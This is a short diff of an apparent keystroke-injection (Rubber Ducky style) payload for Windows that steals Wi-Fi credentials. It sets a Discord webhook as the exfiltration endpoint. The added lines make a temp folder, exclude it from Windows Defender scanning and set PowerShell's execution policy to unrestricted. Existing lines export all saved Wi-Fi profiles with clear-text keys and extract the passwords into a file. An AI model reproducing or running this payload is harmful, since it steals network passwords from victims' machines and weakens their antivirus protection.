@@ -8,6 +8,8 @@ DELAY 2500
 STRING $webhook='%DISCORD_WEBHOOK%'
 ENTER
 DELAY 500
+STRING cd C:\ ; mkdir temp ; cd temp ; Add-MpPreference -ExclusionPath "C:\temp" ; Set-ExecutionPolicy unrestricted
+ENTER
 REM WIFI EXFIL
 STRING netsh wlan export profile key=clear; Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace '.xml:22:', ''} > Wi-fi.txt
 ENTER
